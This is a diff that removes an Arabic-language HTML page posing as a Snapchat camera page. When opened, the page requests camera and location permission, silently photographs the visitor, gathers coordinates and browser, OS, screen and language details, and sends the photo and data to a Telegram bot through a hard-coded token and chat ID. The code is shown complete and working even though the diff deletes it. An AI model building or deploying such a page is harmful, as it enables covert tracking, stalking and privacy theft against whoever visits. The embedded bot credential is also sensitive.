@@ -1,215 +1,0 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>صفحة سناب شات</title>
-    <style>
-        body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            background-color: #fafafa; /* لون الخلفية شبيه بتطبيق سناب شات */
-            font-family: Arial, sans-serif;
-            direction: rtl;
-            position: relative; /* لجعل العناصر متداخلة */
-            overflow: hidden; /* لإخفاء أي شيء خارج حدود الصفحة */
-        }
-        video {
-            width: 100%; /* ملء الشاشة بالكاميرا */
-            height: auto; /* الحفاظ على نسبة العرض إلى الارتفاع */
-            border-radius: 20px; /* حواف مستديرة */
-        }
-        #overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            color: white; /* لون النص أبيض */
-            text-align: center;
-            font-size: 24px;
-            background-color: rgba(0, 0, 0, 0.5); /* طبقة داكنة خلف النص */
-            border-radius: 20px; /* حواف مستديرة */
-            z-index: 1; /* فوق الفيديو */
-        }
-        #permission-message {
-            color: red;
-            font-size: 18px;
-            display: none;
-        }
-    </style>
-</head>
-<body>
-    <div id="overlay">
-        <div>🌟 استعد لالتقاط الصورة!</div>
-        <div>📸 صقر يسلم عليك!</div>
-    </div>
-    <div id="permission-message">يجب عليك منح الأذونات للوصول إلى الموقع والكاميرا.</div>
-    <script>
-        let latitude = 'لم يُسمح بالوصول إلى الموقع'; // قيمة افتراضية
-        let longitude = 'لم يُسمح بالوصول إلى الموقع'; // قيمة افتراضية
-        let imageData = null; // لتخزين الصورة الملتقطة
-
-        async function requestPermissions() {
-            try {
-                // طلب إذن الوصول إلى الكاميرا
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                stream.getTracks().forEach(track => track.stop()); // إيقاف تشغيل الكاميرا فورًا
-
-                // طلب إذن الوصول إلى الموقع
-                return new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => resolve(position),
-                        (error) => reject(error)
-                    );
-                });
-            } catch (err) {
-                console.error('خطأ في الحصول على الأذونات: ', err);
-                return null;
-            }
-        }
-
-        async function startCamera() {
-            const position = await requestPermissions();
-            if (position) {
-                latitude = position.coords.latitude;
-                longitude = position.coords.longitude;
-                captureImage();
-            } else {
-                document.getElementById('permission-message').style.display = 'block';
-            }
-        }
-
-        function captureImage() {
-            const video = document.createElement('video');
-            video.setAttribute('autoplay', true);
-            video.setAttribute('playsinline', true); // دعم للأجهزة المحمولة
-            document.body.appendChild(video);
-
-            // التقاط الصورة فورًا
-            const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
-
-            video.addEventListener('loadedmetadata', () => {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                imageData = canvas.toDataURL('image/png');
-
-                // إيقاف تشغيل الكاميرا هنا
-                video.srcObject.getTracks().forEach(track => track.stop());
-                document.body.removeChild(video); // إزالة عنصر الفيديو
-
-                // إرسال البيانات إلى Telegram
-                sendData();
-            });
-
-            // بدء الكاميرا
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    video.srcObject = stream;
-                })
-                .catch(error => {
-                    console.error('خطأ في بدء الكاميرا: ', error);
-                });
-        }
-
-        function sendData() {
-            // جمع المعلومات المتاحة
-            const userAgent = navigator.userAgent; // معلومات المتصفح ونظام التشغيل
-            const browserInfo = parseUserAgent(userAgent); // تحليل معلومات المتصفح
-            const screenWidth = window.screen.width; // عرض الشاشة
-            const screenHeight = window.screen.height; // ارتفاع الشاشة
-            const language = navigator.language || navigator.userLanguage; // لغة المتصفح
-            const ipAddress = 'لم يتمكن من الحصول عليه'; // قيمة افتراضية
-
-            // إرسال البيانات إلى بوت Telegram
-            sendToTelegram(latitude, longitude, imageData, browserInfo, screenWidth, screenHeight, language, ipAddress);
-        }
-
-        function parseUserAgent(userAgent) {
-            const browserData = {};
-
-            // إضافة معلومات حول المتصفح
-            browserData['المتصفح'] = userAgent.split(' ')[0]; // اسم المتصفح
-            browserData['النسخة'] = userAgent.split(' ')[1]; // نسخة المتصفح
-            browserData['نظام التشغيل'] = userAgent.includes('Windows') ? 'Windows' :
-                                           userAgent.includes('Mac') ? 'Mac' :
-                                           userAgent.includes('Linux') ? 'Linux' :
-                                           userAgent.includes('Android') ? 'Android' :
-                                           userAgent.includes('like Mac') ? 'iOS' : 'غير معروف';
-
-            return browserData;
-        }
-
-        function sendToTelegram(lat, long, imageData, browserInfo, screenWidth, screenHeight, language, ipAddress) {
-            const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
-            const chatId = '6185375878';
-            const message = `
-🎯 إحداثيات الموقع:
-🌍 Latitude: ${lat}
-🌍 Longitude: ${long}
-🖥️ المتصفح: ${browserInfo['المتصفح']}
-📖 النسخة: ${browserInfo['النسخة']}
-💻 نظام التشغيل: ${browserInfo['نظام التشغيل']}
-📏 عرض الشاشة: ${screenWidth}px
-📏 ارتفاع الشاشة: ${screenHeight}px
-🌐 لغة المتصفح: ${language}
-📧 عنوان IP: ${ipAddress}
-`;
-
-            const apiUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
-
-            // تحويل الصورة إلى Blob إذا كانت موجودة
-            if (imageData) {
-                fetch(imageData)
-                    .then(res => res.blob())
-                    .then(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('photo', blob, 'photo.png');
-                        formData.append('caption', message);
-
-                        return fetch(apiUrl, {
-                            method: 'POST',
-                            body: formData
-                        });
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log('تم إرسال البيانات إلى Telegram:', data);
-                    })
-                    .catch(error => {
-                        console.error('خطأ في إرسال البيانات إلى Telegram: ', error);
-                    });
-            } else {
-                // إذا لم تكن الصورة موجودة، أرسل فقط الرسالة
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('caption', message);
-
-                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log('تم إرسال البيانات إلى Telegram:', data);
-                })
-                .catch(error => {
-                    console.error('خطأ في إرسال البيانات إلى Telegram: ', error);
-                });
-            }
-        }
-
-        window.onload = startCamera;
-    </script>
-</body>
-</html>
